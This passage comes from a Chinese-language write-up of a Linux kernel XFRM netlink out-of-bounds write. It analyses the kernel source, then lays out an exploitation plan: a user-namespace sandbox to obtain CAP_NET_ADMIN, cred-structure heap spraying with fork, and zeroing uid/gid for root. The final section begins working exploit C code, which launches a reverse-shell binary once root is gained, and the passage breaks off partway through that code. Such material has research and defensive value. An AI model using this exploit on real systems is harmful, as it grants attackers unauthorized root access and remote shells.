<span class="cm"> *   +----------+- - -+- - - - - - - - - +- - -+-------- - -</span>
<span class="cm"> *                     &lt;- nla_len(nla) -&gt;      ^</span>
<span class="cm"> *   nla_data(nla)----^                        |</span>
<span class="cm"> *   nla_next(nla)-----------------------------'</span>
<span class="cm"> *</span>
<span class="cm"> * Data Structures:</span>
<span class="cm"> *   struct nlattr          netlink attribute header</span>
</pre></div>
<p>从上图可以看出，<strong>发送到内核的数据需要如下形式<code>nlmsghdr</code> + <code>Family Header</code> + <code>n * (nla + data)</code>。</strong></p>
<p>首先从<code>xfrm_netlink_rcv</code>函数中调用<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/netlink/af_netlink.c#L2275" target="_blank">netlink_rcv_skb</a>函数，会检查<code>nlmsg_type</code>及<code>nlmsg_len</code>范围，并交由<code>cb</code>函数处理，其赋值为<code>xfrm_user_rcv_msg</code>。</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">netlink_rcv_skb</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">cb</span><span class="p">)(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="p">,</span>
                             <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="p">))</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="n">nlh</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">&gt;=</span> <span class="n">nlmsg_total_size</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">msglen</span><span class="p">;</span>

        <span class="n">nlh</span> <span class="o">=</span> <span class="n">nlmsg_hdr</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span> <span class="o">&lt;</span> <span class="n">NLMSG_HDRLEN</span> <span class="o">||</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">&lt;</span> <span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">)</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

        <span class="cm">/* Only requests are handled by the kernel */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span> <span class="o">&amp;</span> <span class="n">NLM_F_REQUEST</span><span class="p">))</span>
            <span class="k">goto</span> <span class="n">ack</span><span class="p">;</span>

        <span class="cm">/* Skip control messages */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span> <span class="o">&lt;</span> <span class="n">NLMSG_MIN_TYPE</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">ack</span><span class="p">;</span>

        <span class="n">err</span> <span class="o">=</span> <span class="n">cb</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">nlh</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">skip</span><span class="p">;</span>

<span class="nl">ack</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span> <span class="o">&amp;</span> <span class="n">NLM_F_ACK</span> <span class="o">||</span> <span class="n">err</span><span class="p">)</span>
            <span class="n">netlink_ack</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">nlh</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>

<span class="nl">skip</span><span class="p">:</span>
        <span class="n">msglen</span> <span class="o">=</span> <span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">msglen</span> <span class="o">&gt;</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span>
            <span class="n">msglen</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
        <span class="n">skb_pull</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">msglen</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L2444" target="_blank">xfrm_user_rcv_msg</a>函数中，会根据<code>nlmsg_type</code>到<code>xfrm_dispatch</code>中查找对应要调用的函数，并在[2]处检查对应需要的权限，而在[3]处会根据<code>nla</code>中参数类型，来初始化一个<code>** attr</code>，作为用户输入参数的索引。最终调用<code>link-&gt;doit</code>去执行。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">xfrm_user_rcv_msg</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">nlmsghdr</span> <span class="o">*</span><span class="n">nlh</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span> <span class="o">=</span> <span class="n">sock_net</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_MAX</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">xfrm_link</span> <span class="o">*</span><span class="n">link</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="n">err</span><span class="p">;</span>

<span class="cp">#ifdef CONFIG_COMPAT</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">in_compat_syscall</span><span class="p">())</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EOPNOTSUPP</span><span class="p">;</span>
<span class="cp">#endif</span>

    <span class="n">type</span> <span class="o">=</span> <span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">&gt;</span> <span class="n">XFRM_MSG_MAX</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

    <span class="n">type</span> <span class="o">-=</span> <span class="n">XFRM_MSG_BASE</span><span class="p">;</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">link</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">xfrm_dispatch</span><span class="p">[</span><span class="n">type</span><span class="p">];</span>

    <span class="cm">/* All operations require privileges, even GET */</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">netlink_net_capable</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">CAP_NET_ADMIN</span><span class="p">))</span> <span class="c1">//检查进程权限</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">type</span> <span class="o">==</span> <span class="p">(</span><span class="n">XFRM_MSG_GETSA</span> <span class="o">-</span> <span class="n">XFRM_MSG_BASE</span><span class="p">)</span> <span class="o">||</span>
         <span class="n">type</span> <span class="o">==</span> <span class="p">(</span><span class="n">XFRM_MSG_GETPOLICY</span> <span class="o">-</span> <span class="n">XFRM_MSG_BASE</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
        <span class="p">(</span><span class="n">nlh</span><span class="o">-&gt;</span><span class="n">nlmsg_flags</span> <span class="o">&amp;</span> <span class="n">NLM_F_DUMP</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">link</span><span class="o">-&gt;</span><span class="n">dump</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

        <span class="p">{</span>
            <span class="k">struct</span> <span class="n">netlink_dump_control</span> <span class="n">c</span> <span class="o">=</span> <span class="p">{</span>
                <span class="p">.</span><span class="n">dump</span> <span class="o">=</span> <span class="n">link</span><span class="o">-&gt;</span><span class="n">dump</span><span class="p">,</span>
                <span class="p">.</span><span class="n">done</span> <span class="o">=</span> <span class="n">link</span><span class="o">-&gt;</span><span class="n">done</span><span class="p">,</span>
            <span class="p">};</span>
            <span class="k">return</span> <span class="n">netlink_dump_start</span><span class="p">(</span><span class="n">net</span><span class="o">-&gt;</span><span class="n">xfrm</span><span class="p">.</span><span class="n">nlsk</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span> <span class="n">nlh</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">err</span> <span class="o">=</span> <span class="n">nlmsg_parse</span><span class="p">(</span><span class="n">nlh</span><span class="p">,</span> <span class="n">xfrm_msg_min</span><span class="p">[</span><span class="n">type</span><span class="p">],</span> <span class="n">attrs</span><span class="p">,</span>
              <span class="n">link</span><span class="o">-&gt;</span><span class="n">nla_max</span> <span class="o">?</span> <span class="o">:</span> <span class="n">XFRMA_MAX</span><span class="p">,</span>
              <span class="n">link</span><span class="o">-&gt;</span><span class="n">nla_pol</span> <span class="o">?</span> <span class="o">:</span> <span class="n">xfrma_policy</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">link</span><span class="o">-&gt;</span><span class="n">doit</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">link</span><span class="o">-&gt;</span><span class="n">doit</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">nlh</span><span class="p">,</span> <span class="n">attrs</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>从<code>xfrm_dispatch</code>可见，我们所需的<code>XFRM_MSG_NEWSA</code>及<code>XFRM_MSG_NEWAE</code>，仅需将<code>nlmsg_type</code>设置为相应值即可。</p>
<pre><code>xfrm_dispatch[XFRM_NR_MSGTYPES] = {
    [XFRM_MSG_NEWSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
    [XFRM_MSG_DELSA       - XFRM_MSG_BASE] = { .doit = xfrm_del_sa        },
    [XFRM_MSG_GETSA       - XFRM_MSG_BASE] = { .doit = xfrm_get_sa,
                           .dump = xfrm_dump_sa,
                           .done = xfrm_dump_sa_done  },
    [XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
    [XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
    [XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,
                           .dump = xfrm_dump_policy,
                           .done = xfrm_dump_policy_done },
    [XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },
    [XFRM_MSG_ACQUIRE     - XFRM_MSG_BASE] = { .doit = xfrm_add_acquire   },
    [XFRM_MSG_EXPIRE      - XFRM_MSG_BASE] = { .doit = xfrm_add_sa_expire },
    [XFRM_MSG_UPDPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
    [XFRM_MSG_UPDSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },
    [XFRM_MSG_POLEXPIRE   - XFRM_MSG_BASE] = { .doit = xfrm_add_pol_expire},
    [XFRM_MSG_FLUSHSA     - XFRM_MSG_BASE] = { .doit = xfrm_flush_sa      },
    [XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_flush_policy  },
    [XFRM_MSG_NEWAE       - XFRM_MSG_BASE] = { .doit = xfrm_new_ae  },
    [XFRM_MSG_GETAE       - XFRM_MSG_BASE] = { .doit = xfrm_get_ae  },
    [XFRM_MSG_MIGRATE     - XFRM_MSG_BASE] = { .doit = xfrm_do_migrate    },
    [XFRM_MSG_GETSADINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_sadinfo   },
    [XFRM_MSG_NEWSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_set_spdinfo,
                           .nla_pol = xfrma_spd_policy,
                           .nla_max = XFRMA_SPD_MAX },
    [XFRM_MSG_GETSPDINFO  - XFRM_MSG_BASE] = { .doit = xfrm_get_spdinfo   },
};</code></pre>
<p>而<code>Family Header</code>需要到对应的处理函数中找，以<code>xfrm_add_sa</code>为例，其调用<code>nlmsg_data</code>函数的赋值变量类型为<code>xfrm_usresa_info</code>，即为<code>Family Header</code>。</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">xfrm_usersa_info</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">nlmsg_data</span><span class="p">(</span><span class="n">nlh</span><span class="p">);</span>
</pre></div>
<h2 data-content="1" id="505255282b7275e37adf6c874a386970">利用思路</h2>
<h3 data-content="1" id="53988d0c549b1e97b36118e3bc47ee77">权限限制</h3>
<p>所谓权限限制即是在上文中提到的<code>netlink_net_capable(skb, CAP_NET_ADMIN)</code>检查，所需为<code>CAP_NET_ADMIN</code>权限。但在<code>Linux</code>操作系统中存在命名空间这样的权限隔离机制，在每一个<code>NET</code>沙箱中，非<code>ROOT</code>进程可以具有<code>CAP_NET_ADMIN</code>权限。查看命名空间开启的方式为<code>cat /boot/config* | grep CONFIG_USER_NS</code>，若为「y」，则启用了命名空间。</p>
<p>而对于上述限制的绕过有两种方法，一是使用<code>setcap</code>命令为<code>EXP</code>赋予权限，即执行<code>sudo setcap cap_net_raw,cap_net_admin=eip ./exp</code>。二是仿照<a href="https://github.com/ret2p4nda/linux-kernel-exploits/tree/master/2017/CVE-2017-7308" target="_blank">CVE-2017-7308</a>中设置<code>namespace sandbox</code>，但注意此时无法利用<code>getuid</code>来判断是否为<code>root</code>用户。</p>
<pre><code>void setup_sandbox() {
    int real_uid = getuid();
    int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

        if (unshare(CLONE_NEWNET) != 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    if (!write_file("/proc/self/setgroups", "deny")) {
        perror("[-] write_file(/proc/self/set_groups)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
        perror("[-] write_file(/proc/self/uid_map)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        perror("[-] write_file(/proc/self/gid_map)");
        exit(EXIT_FAILURE);
    }

    cpu_set_t my_set;
    CPU_ZERO(&amp;my_set);
    CPU_SET(0, &amp;my_set);
    if (sched_setaffinity(0, sizeof(my_set), &amp;my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    if (system("/sbin/ifconfig lo up") != 0) {
        perror("[-] system(/sbin/ifconfig lo up)");
        exit(EXIT_FAILURE);
    }
}</code></pre>
<h3 data-content="1" id="0ffe847d533cb13b3e9e172b7d7a73a7">数据包构造</h3>
<p>本漏洞属于一个利用条件比较宽松的漏洞。首先，<code>xfrm_replay_state_esn</code>是一个变长的数据结构，而其长度可以由用户输入的<code>bmp_len</code>来控制，并由<code>kzalloc</code>申请<code>bmp_len *4 + 0x18</code>大小的内存块。其次，越界读写可以每次写1<code>bit</code>大小的数据，同时也可以将<code>(replay_windows -1)&gt;&gt;5</code>比特大小的内存块清空。</p>
<p>并且<code>cred</code>结构体的申请是通过<code>prepare_creds</code>中的<code>new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</code>得到的，但在调试中发现，本内核的<code>cred_jar</code>是<code>kmalloc-192</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133737-2263f0fa-3276-1.jpg"/></p>
<p>根据内核分配使用的<code>slub</code>+伙伴算法可以知道，对于同一个<code>kmem_cache</code>分配出来的内存块有一定概率是相邻。因此一种很取巧的思路，就是将<code>xfrm_replay_state_esn</code>结构体设置为<code>192(0xc0)</code>以内，以利用<code>kmalloc-192</code>进行分配，并利用<code>fork</code>新建大量进程，使申请大量<code>cred</code>，这样喷射之后有很大概率越界读写漏洞存在的位置之后就是一个<code>cred</code>结构体，这样利用之前提到过的置零一段内存的操作就可以将<code>cred</code>结构体中的部分成员<code>(uid gid等)</code>置零，从而对该进程提权，并通过反弹<code>shell</code>就可以得到一个<code>root</code>权限的<code>shell</code>。</p>
<p>因此对于数据包构造主要根据上述思路。</p>
<p><strong>xfrm_add_sa</strong></p>
<p>在触发<code>xfrm_add_sa</code>函数的数据包中，需要满足<code>128 &lt; bmp_len * 4 +0x18 &lt; 192</code>。并且需要参考之前源码分析中的各项<code>flag</code>及参数检查。</p>
<p><strong>xfrm_new_ae</strong></p>
<p>在触发<code>xfrm_new_ae</code>函数的数据包中，需要对<code>seq_hi</code>、<code>seq</code>及<code>replay_window</code>进行设定，<code>replay_window</code>即将要置零的长度大小，由于连续申请了两块大小相同的结构体，而置零的时候是从第一次申请的位置操作的，有可能出现二者相邻，因此需要将<code>replay_window</code>设置稍大一些。而<code>seq_hi</code>、<code>seq</code>两个数据需要结合之后发送的<code>ah</code>数据包中的<code>seq</code>参数，引导<code>xfrm_replay_advance_esn</code>走向置零<code>bmp[0]~bmp[n]</code>这个分支。</p>
<p><strong>AH数据包</strong></p>
<p><code>AH</code>数据包的要求即<code>spi</code>需要和之前申请<code>SA</code>的<code>spi</code>相同用于寻找<code>xfrm_state</code>，并且需要满足</p>
<p><code>diff &gt;= replay_esn-&gt;replay_window</code>，其中<code>diff</code>的数据由<code>xfrm_replay_state_esn</code>中的<code>seq</code>、<code>seq_hi</code>及<code>AH</code>的<code>seq</code>共同决定。还行需在后续单字节写的位置，将<code>cred</code>结构体中<code>usage</code>置回原值。</p>
<p>在<code>xfrm_replay_advance_esn</code>函数执行前后发现，相邻<code>cred</code>中的成员被置零。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133738-22aba99a-3276-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133738-22e28168-3276-1.jpg"/></p>
<h2 data-content="1" id="4bf71b08a5f886ef9f7af5a460ba1e09">EXP</h2>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/netlink.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/in.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/xfrm.h&gt;</span><span class="cp"></span>


<span class="cp">#define MAX_PAYLOAD 4096</span>
<span class="k">struct</span> <span class="n">ip_auth_hdr</span> <span class="p">{</span>
    <span class="n">__u8</span>    <span class="n">nexthdr</span><span class="p">;</span>
    <span class="n">__u8</span>    <span class="n">hdrlen</span><span class="p">;</span>
    <span class="n">__be16</span>  <span class="n">reserved</span><span class="p">;</span>   <span class="cm">/* big endian */</span>
    <span class="n">__be32</span>  <span class="n">spi</span><span class="p">;</span>        <span class="cm">/* big endian */</span>
    <span class="n">__be32</span>  <span class="n">seq_no</span><span class="p">;</span>     <span class="cm">/* big endian */</span>
    <span class="n">__u8</span>    <span class="n">auth_data</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">};</span>


<span class="kt">void</span> <span class="nf">fork_spary_n</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="p">;</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">==</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">sleep</span><span class="p">(</span><span class="n">time</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] now get r00t</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"id"</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/home/p4nda/Desktop/reverse_shell"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span><span class="p">{</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">init_xfrm_socket</span><span class="p">(){</span>
    <span class="k">struct</span> <span class="n">sockaddr_nl</span> <span class="n">addr</span><span class="p">;</span> 
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">xfrm_socket</span><span class="p">;</span>
    <span class="n">xfrm_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">NETLINK_XFRM</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">xfrm_socket</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad NETLINK_XFRM socket "</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">nl_family</span> <span class="o">=</span> <span class="n">PF_NETLINK</span><span class="p">;</span>  
    <span class="n">addr</span><span class="p">.</span><span class="n">nl_pad</span>    <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
    <span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span>    <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>  
    <span class="n">addr</span><span class="p">.</span><span class="n">nl_groups</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">xfrm_socket</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad bind "</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">xfrm_socket</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span> 
    <span class="k">return</span> <span class="n">xfrm_socket</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">init_recvfd</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">recvfd</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">recvfd</span><span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_AH</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">recvfd</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad IPPROTO_AH socket "</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">recvfd</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">init_sendfd</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">sendfd</span><span class="o">=-</span><span class="mi">1</span><span class="p">,</span><span class="n">err</span><span class="p">;</span>  
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
    <span class="n">sendfd</span><span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_AH</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sendfd</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad IPPROTO_AH socket "</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0x4869</span><span class="p">);</span>
    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">sendfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[-] bad bind"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>      
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">sendfd</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">dump_data</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"========================="</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="p">((</span><span class="n">len</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span><span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"0x%lx"</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">16</span><span class="p">)</span>
